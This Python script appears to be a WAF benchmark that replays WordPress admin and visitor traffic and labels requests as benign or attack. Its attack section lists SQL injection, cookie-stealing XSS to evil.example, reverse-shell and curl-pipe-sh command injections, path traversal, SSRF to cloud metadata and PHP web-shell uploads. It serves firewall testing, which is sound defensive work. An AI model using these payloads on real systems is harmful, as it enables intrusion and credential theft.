"""Scripted WordPress traffic: an admin writing a technical blog, visitors commenting, plus attacks.

Every call to Actor.send() goes through both WAFs. `B()` marks benign use and
`A()` an attack, with the input (`target`) that carries the content of interest.
"""
from __future__ import annotations

import json
import re
import time
import urllib.parse

from benchlib import CREDENTIALS, Bench, find_form, form_fields, multipart

PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d4948445200000001000000010806000000"
    "1f15c4890000000d49444154789c6360f8cfc0f01f0005000201e5273de70000000049454e44ae426082"
)


def B(rid, category, notes, collection=None, parameter=None):
    return {"id": f"wp-{rid}", "kind": "benign", "category": category, "notes": notes,
            "target": {"collection": collection, "parameter": parameter} if collection else None}


def A(rid, category, notes, collection, parameter=None):
    return {"id": f"wp-atk-{rid}", "kind": "attack", "category": category, "notes": notes,
            "target": {"collection": collection, "parameter": parameter}}


# Block editor markup the way Gutenberg serializes it (code block contents are HTML-escaped).
BLOCK_POSTS = [
    ("How to select the best index for a slow query",
     "<!-- wp:paragraph --><p>When a report page gets slow, select the best candidate column first. "
     "Here is the query from our dashboard:</p><!-- /wp:paragraph -->"
     "<!-- wp:code --><pre class=\"wp-block-code\"><code>SELECT id, title, created_at\nFROM posts\n"
     "WHERE status = 'publish' AND author_id = 42\nORDER BY created_at DESC\nLIMIT 10;</code></pre><!-- /wp:code -->"
     "<!-- wp:paragraph --><p>Then run <code>EXPLAIN ANALYZE</code> and add a composite index:</p><!-- /wp:paragraph -->"
     "<!-- wp:code --><pre class=\"wp-block-code\"><code>CREATE INDEX idx_posts_author_status ON posts (author_id, status, created_at);"
     "\n-- drop it again if writes suffer\nDROP INDEX idx_posts_author_status;</code></pre><!-- /wp:code -->"),
    ("Shell one-liners I use every week",
     "<!-- wp:paragraph --><p>A few commands that save me time on servers:</p><!-- /wp:paragraph -->"
     "<!-- wp:code --><pre class=\"wp-block-code\"><code>find /var/log -name '*.gz' -mtime +30 -delete\n"
     "du -sh /home/* | sort -h | tail -5\ncurl -fsSL https://get.docker.com | sh\n"
     "tar -czf backup-$(date +%F).tar.gz /etc/nginx &amp;&amp; ls -la</code></pre><!-- /wp:code -->"
     "<!-- wp:list --><ul><li>Check <code>/etc/passwd</code> for stale accounts</li><li>Rotate keys in <code>~/.ssh/authorized_keys</code></li></ul><!-- /wp:list -->"),
    ("Union, intersect and the art of choosing",
     "<!-- wp:quote --><blockquote class=\"wp-block-quote\"><p>\"Select the best, union the rest, and drop what "
     "does not serve you.\"</p><cite>My grandmother, on wardrobes</cite></blockquote><!-- /wp:quote -->"
     "<!-- wp:paragraph --><p>She was right: <em>having</em> fewer things, <strong>ordered by</strong> how "
     "often you use them, is calmer. Where 1=1 in life? Nowhere.</p><!-- /wp:paragraph -->"),
    ("Embedding a PHP snippet in a theme",
     "<!-- wp:paragraph --><p>Add this to <code>functions.php</code> in your child theme:</p><!-- /wp:paragraph -->"
     "<!-- wp:code --><pre class=\"wp-block-code\"><code>&lt;?php\nadd_filter( 'the_title', function ( $title ) {\n"
     "    return esc_html( $title );\n} );\n// include get_template_directory() . '/inc/helpers.php';</code></pre><!-- /wp:code -->"
     "<!-- wp:html --><div class=\"note\" style=\"border:1px solid #ccc;padding:8px\" onclick=\"this.classList.toggle('open')\">"
     "Click to expand</div><!-- /wp:html -->"),
    ("Markdown cheatsheet",
     "<!-- wp:paragraph --><p># Heading\n## Sub-heading\n* item one\n* item `two`\n[link](https://example.org/?a=1&amp;b=2)"
     "</p><!-- /wp:paragraph --><!-- wp:table --><figure class=\"wp-block-table\"><table><tr><td>a | b</td><td>"
     "`x &lt; y`</td></tr></table></figure><!-- /wp:table -->"),
    ("Embedding a gist and a video",
     "<!-- wp:html --><script src=\"https://gist.github.com/example/0123456789abcdef.js\"></script><!-- /wp:html -->"
     "<!-- wp:embed {\"url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\"type\":\"video\"} -->"
     "<figure class=\"wp-block-embed is-type-video\"><div class=\"wp-block-embed__wrapper\">"
     "https://www.youtube.com/watch?v=dQw4w9WgXcQ</div></figure><!-- /wp:embed -->"),
]

CLASSIC_POSTS = [
    ("Windows paths and environment variables",
     "<p>On Windows the config lives in <code>C:\\Users\\%USERNAME%\\AppData\\Roaming\\app\\config.ini</code>. "
     "Relative includes like <code>..\\..\\shared\\common.ini</code> are resolved from there.</p>\n"
     "<pre>set PATH=%PATH%;C:\\tools\\bin\necho %ERRORLEVEL%</pre>"),
    ("JavaScript event listeners",
     "<p>Attach handlers after load:</p>\n<pre><code>document.querySelector('#menu').addEventListener('click', () =&gt; {\n"
     "  window.location.href = '/contact?ref=' + encodeURIComponent(document.title);\n});</code></pre>\n"
     "<p>Avoid inline <code>onload=</code> attributes in your markup.</p>"),
    ("Notes from the DB meetup",
     "Talks covered: select statements, union all vs union, \"drop table\" horror stories, and why "
     "'OR 1=1' still shows up in pentest reports.\n\n<blockquote>insert coin to continue</blockquote>\n\n"
     "Next meetup: 2026-12-04, room #3; bring a laptop & charger."),
]

COMMENTS = [
    ("Priya", "priya@example.org", "https://priya.example.org",
     "Great post! I ran SELECT * FROM wp_posts WHERE post_status = 'draft' and found 40 old drafts."),
    ("Tom O'Connor", "tom@example.net", "", "Doesn't work for me :( it says \"permission denied\" on /var/www/html/wp-content/uploads"),
    ("dev_null", "null@example.com", "", "Tip: use `grep -r \"eval(\" wp-content/` to find suspicious plugins."),
    ("Lena", "lena@example.de", "", "<p>Thanks!</p><blockquote>select the best, union the rest</blockquote> made my day"),
    ("Sam", "sam@example.org", "https://github.com/sam", "What about ../includes/config.php? Is that path safe to expose?"),
]


def login(wp):
    wp.get("/wp-login.php", record=B("login-page", "login", "login page"))
    wp.send("POST", "/wp-login.php", form=[
        ("log", CREDENTIALS["wp_user"]), ("pwd", CREDENTIALS["wp_password"]), ("rememberme", "forever"),
        ("wp-submit", "Log In"), ("redirect_to", "http://wp.bench/wp-admin/"), ("testcookie", "1")],
        record=B("login-submit", "login", "admin login with redirect_to", "ARGS", "redirect_to"))
    # Set by WordPress's own admin JavaScript in a real browser.
    wp.set_cookie("wp-settings-1", "libraryContent%3Dbrowse%26editor%3Dhtml%26mfold%3Do%26posts_list_mode%3Dlist")
    wp.set_cookie("wp-settings-time-1", str(int(time.time())))
    wp.get("/wp-admin/")


def rest_nonce(wp):
    return wp.get("/wp-admin/admin-ajax.php?action=rest-nonce").text.strip()


def block_editor(wp, nonce):
    ids = []
    for n, (title, content) in enumerate(BLOCK_POSTS):
        page = wp.get("/wp-admin/post-new.php")
        form = find_form(page.text, **{"class": "metabox-base-form"})
        post_id = dict(form["fields"]).get("post_ID") if form else None
        if not post_id:
            continue
        ids.append(post_id)
        api = {"X-WP-Nonce": nonce, "Accept": "application/json, */*;q=0.1"}
        wp.send("POST", f"/wp-json/wp/v2/posts/{post_id}/autosaves?_locale=user", headers=api,
                json_body={"id": int(post_id), "title": title, "content": content[: len(content) // 2]},
                record=B(f"block-autosave-{n}", "editor", "block editor autosave", "ARGS", "json.content"))
        wp.send("POST", f"/wp-json/wp/v2/posts/{post_id}?_locale=user", headers=api,
                json_body={"id": int(post_id), "title": title, "content": content, "status": "publish",
                           "excerpt": title.lower()},
                record=B(f"block-publish-{n}", "editor", "block editor publish", "ARGS", "json.content"))
    if ids:
        api = {"X-WP-Nonce": nonce, "Accept": "application/json, */*;q=0.1"}
        wp.send("POST", f"/wp-json/wp/v2/posts/{ids[0]}?_locale=user", headers={**api, "X-HTTP-Method-Override": "PUT"},
                json_body={"id": int(ids[0]), "content": BLOCK_POSTS[0][1] + "<!-- wp:paragraph --><p>Update: "
                           "the index cut the query from 2s to 40ms.</p><!-- /wp:paragraph -->"},
                record=B("block-update", "editor", "block editor update via X-HTTP-Method-Override", "ARGS", "json.content"))
        wp.get(f"/wp-admin/post.php?post={ids[0]}&action=edit")
    return ids


def classic_editor(wp, heartbeat_nonce_holder):
    ids = []
    for n, (title, content) in enumerate(CLASSIC_POSTS):
        page = wp.get("/wp-admin/post-new.php?classic-editor&classic-editor__forget")
        form = find_form(page.text, id="post")
        beat = re.search(r'heartbeatSettings = \{"nonce":"([0-9a-f]+)"', page.text)
        if not form:
            continue
        fields = dict(form["fields"])
        post_id = fields.get("post_ID")
        ids.append(post_id)
        if beat:
            heartbeat_nonce_holder.append(beat.group(1))
            wp.send("POST", "/wp-admin/admin-ajax.php", form=[
                ("data[wp_autosave][post_id]", post_id), ("data[wp_autosave][post_type]", "post"),
                ("data[wp_autosave][post_author]", "1"), ("data[wp_autosave][post_title]", title),
                ("data[wp_autosave][content]", content), ("data[wp_autosave][excerpt]", ""),
                ("data[wp_autosave][catslist]", "1"), ("data[wp_autosave][comment_status]", "open"),
                ("data[wp_autosave][ping_status]", "open"), ("data[wp_autosave][auto_draft]", "1"),
                ("data[wp_autosave][_wpnonce]", fields.get("_wpnonce", "")),
                ("interval", "60"), ("_nonce", beat.group(1)), ("action", "heartbeat"),
                ("screen_id", "post"), ("has_focus", "true")],
                record=B(f"classic-heartbeat-{n}", "editor", "classic editor heartbeat autosave",
                         "ARGS", "data[wp_autosave][content]"))
        wp.send("POST", "/wp-admin/post.php", form=form_fields(form, {
            "post_title": title, "content": content, "post_status": "publish", "publish": "Publish",
            "tax_input[post_tag]": "sql, shell, notes", "excerpt": "", "post_name": ""}),
            record=B(f"classic-publish-{n}", "editor", "classic editor publish", "ARGS", "content"))
    if ids and ids[0]:
        page = wp.get(f"/wp-admin/post.php?post={ids[0]}&action=edit&classic-editor")
        form = find_form(page.text, id="post")
        if form:
            wp.send("POST", "/wp-admin/post.php", form=form_fields(form, {
                "content": CLASSIC_POSTS[0][1] + "\n<p>Edit: <code>%APPDATA%</code> also works.</p>", "save": "Update"}),
                record=B("classic-edit", "editor", "classic editor edit existing post", "ARGS", "content"))
    return ids


def media(wp, nonce, post_id):
    api = {"X-WP-Nonce": nonce, "Accept": "application/json, */*;q=0.1"}
    body, ctype = multipart([("post", str(post_id or 0))], [("file", "query-plan (final) v2.png", "image/png", PNG)])
    r = wp.send("POST", "/wp-json/wp/v2/media?_locale=user", body=body, content_type=ctype, headers=api,
                record=B("media-rest-upload", "media", "block editor image upload", "FILES", "file"))
    media_id = (r.json() or {}).get("id") if isinstance(r.json(), dict) else None
    if media_id:
        wp.send("POST", f"/wp-json/wp/v2/media/{media_id}?_locale=user", headers=api,
                json_body={"alt_text": "EXPLAIN output: \"Seq Scan on posts\" vs \"Index Scan\"",
                           "caption": "<em>Before & after</em> adding the index", "title": "query plan"},
                record=B("media-rest-meta", "media", "edit image alt text and caption", "ARGS", "json.caption"))
    page = wp.get("/wp-admin/media-new.php")
    upload_nonce = re.search(r'"_wpnonce":"([0-9a-f]+)"', page.text)
    if upload_nonce:
        body, ctype = multipart([("name", "Team photo – Ångström's office.png"), ("action", "upload-attachment"),
                                 ("_wpnonce", upload_nonce.group(1))],
                                [("async-upload", "Team photo – Ångström's office.png", "image/png", PNG)])
        r = wp.send("POST", "/wp-admin/async-upload.php", body=body, content_type=ctype,
                    record=B("media-library-upload", "media", "media library upload with odd file name", "FILES", "async-upload"))
        data = (r.json() or {}).get("data") if isinstance(r.json(), dict) else None
        if isinstance(data, dict) and data.get("id"):
            wp.send("POST", "/wp-admin/admin-ajax.php", form=[
                ("action", "save-attachment"), ("id", str(data["id"])),
                ("nonce", (data.get("nonces") or {}).get("update", "")), ("post_id", "0"),
                ("changes[caption]", "Our office, 3rd floor; \"the aquarium\""),
                ("changes[alt]", "people at desks <laptops>")],
                record=B("media-library-edit", "media", "media library caption edit", "ARGS", "changes[caption]"))
    wp.get("/wp-admin/upload.php?mode=list&s=office")


def comments(bench, post_ids):
    visitor = bench.actor("wordpress")
    for n, (author, email, url, text) in enumerate(COMMENTS):
        post_id = post_ids[n % len(post_ids)] if post_ids else "1"
        visitor.get(f"/?p={post_id}")
        visitor.send("POST", "/wp-comments-post.php", form=[
            ("comment", text), ("author", author), ("email", email), ("url", url),
            ("submit", "Post Comment"), ("comment_post_ID", str(post_id)), ("comment_parent", "0")],
            record=B(f"comment-{n}", "comment", "visitor comment", "ARGS", "comment"))
        time.sleep(0.2)
    return visitor


def admin_comment_reply(wp, post_id):
    page = wp.get("/wp-admin/edit-comments.php")
    match = re.search(r'name="_ajax_nonce-replyto-comment" value="([0-9a-f]+)"', page.text)
    comment_id = re.search(r'id="comment-(\d+)"', page.text)
    if match and comment_id:
        wp.send("POST", "/wp-admin/admin-ajax.php", form=[
            ("action", "replyto-comment"), ("comment_ID", comment_id.group(1)), ("comment_post_ID", str(post_id)),
            ("_ajax_nonce-replyto-comment", match.group(1)),
            ("content", "Try <code>chmod 755 wp-content/uploads</code> and check the owner with <code>ls -la</code>."),
            ("status", ""), ("position", "-1"), ("checkbox", "1"), ("mode", "dashboard")],
            record=B("comment-admin-reply", "comment", "admin replies to a comment", "ARGS", "content"))


def settings(wp):
    def submit(path, overrides, rid, notes, parameter, action="options.php"):
        page = wp.get(path)
        form = next((f for f in __import__("benchlib").html_forms(page.text)
                     if (f["attrs"].get("action") or "").endswith(action)), None)
        if form:
            wp.send("POST", "/wp-admin/" + action, form=form_fields(form, overrides),
                    record=B(rid, "settings", notes, "ARGS", parameter))

    submit("/wp-admin/options-general.php", {
        "blogname": "Bench Notes: SQL, shell & <code>",
        "blogdescription": "select the best; drop the rest -- a blog about databases",
        "date_format": "custom", "date_format_custom": "Y-m-d \\a\\t H:i", "timezone_string": "Europe/Berlin"},
        "settings-general", "general settings with SQL-looking tagline", "blogdescription")
    submit("/wp-admin/options-discussion.php", {
        "moderation_keys": "viagra\ncasino\nunion select\n<script\nhttp://bit.ly/",
        "disallowed_keys": "eval(\nbase64_decode\n../../\n/etc/passwd", "comment_max_links": "2"},
        "settings-discussion", "comment moderation word lists", "disallowed_keys")
    submit("/wp-admin/options-permalink.php", {
        "selection": "/%year%/%monthnum%/%postname%/", "permalink_structure": "/%year%/%monthnum%/%postname%/",
        "category_base": "topics", "tag_base": ""},
        "settings-permalink", "permalink structure with % tags", "permalink_structure", action="options-permalink.php")
    page = wp.get("/wp-admin/profile.php")
    form = find_form(page.text, id="your-profile")
    if form:
        wp.send("POST", "/wp-admin/profile.php", form=form_fields(form, {
            "first_name": "Ama", "last_name": "O'Neil-Smith", "url": "https://example.org/~ama?ref=wp&lang=en",
            "description": "DBA by day. I <strong>select</strong> carefully, <em>join</em> rarely, and never "
                           "<code>rm -rf /</code> on Fridays.", "pass1": None, "pass2": None}),
            record=B("settings-profile", "settings", "profile bio with HTML", "ARGS", "description"))


def customizer(wp):
    page = wp.get("/wp-admin/customize.php")
    nonces = re.search(r'"nonce":\{"save":"([0-9a-f]+)","preview":"([0-9a-f]+)"', page.text)
    uuid = re.search(r'"changeset":\{"uuid":"([0-9a-f-]+)"', page.text) or re.search(r'"uuid":"([0-9a-f-]{36})"', page.text)
    theme = re.search(r'"stylesheet":"([a-z0-9-]+)"', page.text)
    if not (nonces and uuid):
        return
    theme_name = theme.group(1) if theme else "twentytwentyone"
    css = (".site-title a { color: #c00 !important; }\n.entry-content pre { font-family: \"Fira Code\", monospace; }\n"
           "/* select the best font */\n.wp-block-quote::before { content: \"\\201C\"; }\n"
           "@media (max-width: 600px) { .site-header { padding: 0 1em; } }")
    changes = {f"custom_css[{theme_name}]": {"value": css},
               "blogdescription": {"value": "select the best; drop the rest"}}
    channel = "preview-0"
    wp.send("POST", f"/?customize_changeset_uuid={uuid.group(1)}&customize_theme={theme_name}"
            f"&customize_messenger_channel={channel}&customize_autosaved=on",
            form=[("wp_customize", "on"), ("customize_theme", theme_name), ("nonce", nonces.group(2)),
                  ("customize_changeset_uuid", uuid.group(1)), ("customized", json.dumps({k: v["value"] for k, v in changes.items()})),
                  ("customize_messenger_channel", channel)],
            record=B("customizer-preview", "customizer", "customizer live preview with custom CSS", "ARGS", "customized"))
    wp.send("POST", "/wp-admin/admin-ajax.php", form=[
        ("wp_customize", "on"), ("customize_theme", theme_name), ("nonce", nonces.group(1)),
        ("customize_changeset_uuid", uuid.group(1)), ("customize_autosaved", "on"),
        ("customize_changeset_data", json.dumps(changes)), ("customize_changeset_status", "publish"),
        ("action", "customize_save")],
        record=B("customizer-save", "customizer", "customizer publish custom CSS", "ARGS", "customize_changeset_data"))


def menus(wp):
    page = wp.get("/wp-admin/nav-menus.php?action=edit&menu=0")
    form = find_form(page.text, id="update-nav-menu")
    if not form:
        return
    r = wp.send("POST", "/wp-admin/nav-menus.php?menu=0", form=form_fields(form, {
        "menu-name": "Main & Footer (2026)", "save_menu": "Create Menu"}),
        record=B("menu-create", "menus", "create a navigation menu", "ARGS", "menu-name"))
    menu_id = re.search(r"menu=(\d+)", r.header("Location") or "")
    if not menu_id:
        return
    page = wp.get(f"/wp-admin/nav-menus.php?action=edit&menu={menu_id.group(1)}")
    column = re.search(r'name="menu-settings-column-nonce" value="([0-9a-f]+)"', page.text)
    if not column:
        return
    item = wp.send("POST", "/wp-admin/admin-ajax.php", form=[
        ("action", "add-menu-item"), ("menu", menu_id.group(1)), ("menu-settings-column-nonce", column.group(1)),
        ("menu-item[-1][menu-item-type]", "custom"), ("menu-item[-1][menu-item-url]", "https://example.org/docs/select?q=best+of&sort=desc"),
        ("menu-item[-1][menu-item-title]", "Docs: SELECT & JOIN")],
        record=B("menu-add-item", "menus", "add custom link to menu", "ARGS", "menu-item[-1][menu-item-url]"))
    db_id = re.search(r'menu-item-db-id\[(\d+)\]', item.text)
    form = find_form(page.text, id="update-nav-menu")
    if db_id and form:
        i = db_id.group(1)
        data = [{"name": f"menu-item-{k}[{i}]", "value": v} for k, v in (
            ("db-id", i), ("object-id", i), ("object", "custom"), ("parent-id", "0"), ("position", "1"),
            ("type", "custom"), ("title", "Docs: SELECT & JOIN"), ("url", "https://example.org/docs/select?q=best+of&sort=desc"),
            ("attr-title", "union of all docs"), ("classes", "menu-docs"), ("xfn", ""), ("description", ""))]
        wp.send("POST", f"/wp-admin/nav-menus.php?menu={menu_id.group(1)}", form=form_fields(form, {
            "nav-menu-data": json.dumps(data), "menu-name": "Main & Footer (2026)", "menu-locations[primary]": menu_id.group(1),
            "auto-add-pages": "1", "save_menu": "Save Menu"}),
            record=B("menu-save", "menus", "save menu (serialized nav-menu-data JSON)", "ARGS", "nav-menu-data"))


def widgets(wp, nonce):
    api = {"X-WP-Nonce": nonce, "Accept": "application/json, */*;q=0.1"}
    wp.get("/wp-json/wp/v2/sidebars?context=edit&per_page=-1&_locale=user", headers=api)
    wp.send("POST", "/wp-json/batch/v1?_locale=user", headers=api, json_body={
        "validation": "require-all-validate",
        "requests": [{"method": "POST", "path": "/wp/v2/widgets", "body": {
            "id_base": "block", "sidebar": "sidebar-1",
            "instance": {"raw": {"content": "<!-- wp:html --><a href=\"https://example.org/feed?format=rss&amp;cat=1\">"
                                            "RSS</a> | <code>SELECT 1;</code><!-- /wp:html -->"}}}}]},
        record=B("widget-batch", "widgets", "block widget saved via REST batch", "ARGS", "json.requests.array_0.body.instance.raw.content"))


def search_and_rest(wp, nonce):
    visitor_queries = ["select the best laptop", "union station opening hours", "drop shipping vs warehouse",
                       "\"order by\" tutorial", "C:\\Windows\\System32 drivers", "can't connect to mysql; error 2002",
                       "what is <html>?", "1=1 meaning", "cat /etc/os-release output"]
    visitor = wp.bench.actor("wordpress")
    for n, q in enumerate(visitor_queries):
        visitor.get("/", query={"s": q}, record=B(f"search-{n}", "search", "front-end site search", "ARGS", "s"))
    api = {"X-WP-Nonce": nonce, "Accept": "application/json, */*;q=0.1"}
    for n, q in enumerate(["select the best", "union", "how to drop a table safely"]):
        wp.get("/wp-json/wp/v2/search", query={"search": q, "per_page": "20", "type": "post", "subtype": "any", "_locale": "user"},
               headers=api, record=B(f"rest-link-search-{n}", "search", "block editor link search", "ARGS", "search"))
    wp.get("/wp-json/wp/v2/posts", query={"search": "select the best", "per_page": "5", "_embed": "1"},
           record=B("rest-posts-search", "rest", "REST posts search (theme)", "ARGS", "search"))
    wp.get("/wp-json/wp/v2/users/me?context=edit&_locale=user", headers=api)
    wp.get("/wp-json/wp/v2/types?context=view&_locale=user", headers=api)
    wp.get("/wp-json/wp/v2/block-patterns/patterns?_locale=user", headers=api)
    wp.send("POST", "/wp-json/wp/v2/categories?_locale=user", headers=api,
            json_body={"name": "SQL & Databases", "description": "Posts about SELECT, JOIN, UNION and friends", "slug": "sql"},
            record=B("rest-category-create", "rest", "create category", "ARGS", "json.description"))
    wp.send("POST", "/wp-json/wp/v2/tags?_locale=user", headers=api, json_body={"name": "c:\\temp & /tmp"},
            record=B("rest-tag-create", "rest", "create tag with path-like name", "ARGS", "json.name"))
    wp.send("POST", "/wp-json/wp/v2/settings?_locale=user", headers=api,
            json_body={"title": "Bench Notes", "description": "SELECT * FROM ideas WHERE good = true"},
            record=B("rest-settings", "rest", "site settings via REST", "ARGS", "json.description"))
    wp.get("/wp-json/wp-block-editor/v1/url-details", query={"url": "https://wordpress.org/news/", "_locale": "user"},
           headers=api, record=B("rest-url-details", "rest", "link preview in editor (server fetches URL)", "ARGS", "url"))
    wp.get("/wp-json/oembed/1.0/proxy", query={"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_locale": "user"},
           headers=api, record=B("rest-oembed-proxy", "rest", "embed preview (server fetches URL)", "ARGS", "url"))
    wp.get("/wp-json/wp/v2/comments?post=1&per_page=10&_locale=user", headers=api)
    wp.get("/feed/")
    wp.get("/wp-admin/edit.php?post_type=post&s=select+the+best&post_status=all",
           record=B("admin-post-search", "search", "admin posts list search", "ARGS", "s"))


# --- attacks ------------------------------------------------------------------

SQLI = ["' UNION SELECT user_login,user_pass FROM wp_users-- -", "1' AND SLEEP(5)#",
        "1) OR 1=1 INTO OUTFILE '/var/www/html/x.php'-- "]
XSS = ["\"><script>alert(document.cookie)</script>", "<svg/onload=fetch('//evil.example/'+document.cookie)>",
       "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"]
RCE = ["; cat /etc/passwd", "$(curl -s http://evil.example/x.sh|sh)", "| nc -e /bin/sh 203.0.113.9 4444"]
TRAVERSAL = ["../../../../wp-config.php", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/shadow"]
SSRF = ["http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://127.0.0.1:3306/",
        "gopher://127.0.0.1:6379/_FLUSHALL"]
PHPI = ["<?php system($_GET['c']); ?>", "<?php eval(base64_decode($_POST['x'])); ?>",
        "O:8:\"stdClass\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}"]


def attacks(bench, wp, nonce, post_id):
    visitor = bench.actor("wordpress")
    for n, payload in enumerate(SQLI):
        visitor.get("/", query={"s": payload}, record=A(f"sqli-search-{n}", "sqli", "SQLi in site search", "ARGS", "s"))
    for n, payload in enumerate(XSS):
        visitor.get("/", query={"s": payload}, record=A(f"xss-search-{n}", "xss", "reflected XSS in site search", "ARGS", "s"))
    visitor.get("/wp-json/wp/v2/posts", query={"search": SQLI[0], "per_page": "5"},
                record=A("sqli-rest-search", "sqli", "SQLi in REST search", "ARGS", "search"))
    visitor.get("/wp-json/wp/v2/users", query={"orderby": "id`) UNION SELECT 1,user_pass FROM wp_users-- -"},
                record=A("sqli-rest-orderby", "sqli", "SQLi in REST orderby", "ARGS", "orderby"))
    for n, (category, payload) in enumerate([("xss", XSS[0]), ("xss", XSS[1]), ("sqli", SQLI[0]), ("rce", RCE[1]),
                                             ("php", PHPI[0]), ("lfi", TRAVERSAL[0])]):
        visitor.send("POST", "/wp-comments-post.php", form=[
            ("comment", f"nice post {payload}"), ("author", "visitor"), ("email", "v@example.org"), ("url", ""),
            ("submit", "Post Comment"), ("comment_post_ID", str(post_id)), ("comment_parent", "0")],
            record=A(f"{category}-comment-{n}", category, "attack payload in comment body", "ARGS", "comment"))
        time.sleep(0.2)
    visitor.send("POST", "/wp-comments-post.php", form=[
        ("comment", "hello"), ("author", XSS[2]), ("email", "v2@example.org"), ("url", "javascript:alert(document.domain)"),
        ("submit", "Post Comment"), ("comment_post_ID", str(post_id)), ("comment_parent", "0")],
        record=A("xss-comment-author", "xss", "XSS in comment author name", "ARGS", "author"))
    visitor.send("POST", "/wp-login.php", form=[
        ("log", "admin' OR '1'='1'-- -"), ("pwd", "x"), ("wp-submit", "Log In"),
        ("redirect_to", "http://wp.bench/wp-admin/"), ("testcookie", "1")],
        record=A("sqli-login", "sqli", "SQLi in login username", "ARGS", "log"))
    visitor.get("/wp-login.php", query={"action": "lostpassword", "redirect_to": "http://wp.bench/" + TRAVERSAL[1]},
                record=A("lfi-login-redirect", "lfi", "path traversal in redirect_to", "ARGS", "redirect_to"))
    for n, payload in enumerate(TRAVERSAL):
        visitor.get("/wp-admin/admin-ajax.php", query={"action": "download_file", "file": payload},
                    record=A(f"lfi-ajax-file-{n}", "lfi", "path traversal in admin-ajax file parameter", "ARGS", "file"))
    for n, payload in enumerate(RCE):
        visitor.get("/", query={"s": "test" + payload}, record=A(f"rce-search-{n}", "rce", "command injection in search", "ARGS", "s"))
    api = {"X-WP-Nonce": nonce, "Accept": "application/json, */*;q=0.1"}
    for n, payload in enumerate(SSRF):
        wp.get("/wp-json/wp-block-editor/v1/url-details", query={"url": payload, "_locale": "user"}, headers=api,
               record=A(f"ssrf-url-details-{n}", "ssrf", "SSRF through editor link preview", "ARGS", "url"))
    wp.get("/wp-json/oembed/1.0/proxy", query={"url": SSRF[0], "_locale": "user"}, headers=api,
           record=A("ssrf-oembed", "ssrf", "SSRF through oEmbed proxy", "ARGS", "url"))
    # Stored payloads through the editor, as a compromised or hostile author would send them.
    if post_id:
        for n, (category, payload) in enumerate([("xss", "<script>new Image().src='//evil.example/?c='+document.cookie</script>"),
                                                 ("php", PHPI[1]), ("sqli", SQLI[2])]):
            wp.send("POST", f"/wp-json/wp/v2/posts/{post_id}/autosaves?_locale=user", headers=api,
                    json_body={"id": int(post_id), "content": f"<!-- wp:html -->{payload}<!-- /wp:html -->"},
                    record=A(f"{category}-block-content-{n}", category, "payload in block editor content", "ARGS", "json.content"))
    body, ctype = multipart([("post", "0")], [("file", "shell.php", "application/x-php", PHPI[0].encode())])
    wp.send("POST", "/wp-json/wp/v2/media?_locale=user", body=body, content_type=ctype, headers=api,
            record=A("php-media-upload", "php", "PHP web shell uploaded as media", "FILES", "file"))
    page = wp.get("/wp-admin/options-general.php")
    form = next((f for f in __import__("benchlib").html_forms(page.text) if (f["attrs"].get("action") or "") == "options.php"), None)
    if form:
        wp.send("POST", "/wp-admin/options.php", form=form_fields(form, {"blogdescription": PHPI[0]}),
                record=A("php-settings-tagline", "php", "PHP code in site tagline", "ARGS", "blogdescription"))
    wp.send("POST", "/wp-admin/admin-ajax.php", form=[("action", "heartbeat"), ("_nonce", "x"),
                                                      ("data[wp_autosave][content]", RCE[0]), ("screen_id", "post")],
            record=A("rce-heartbeat", "rce", "command injection in heartbeat autosave", "ARGS", "data[wp_autosave][content]"))


def run(bench: Bench) -> None:
    wp = bench.actor("wordpress")
    wp.get("/", record=B("home", "navigation", "front page"))
    login(wp)
    nonce = rest_nonce(wp)
    block_ids = block_editor(wp, nonce)
    beats: list[str] = []
    classic_ids = classic_editor(wp, beats)
    post_ids = [p for p in block_ids + classic_ids if p]
    media(wp, nonce, post_ids[0] if post_ids else 0)
    comments(bench, post_ids)
    admin_comment_reply(wp, post_ids[0] if post_ids else 1)
    settings(wp)
    customizer(wp)
    menus(wp)
    widgets(wp, nonce)
    search_and_rest(wp, nonce)
    attacks(bench, wp, nonce, post_ids[0] if post_ids else 1)
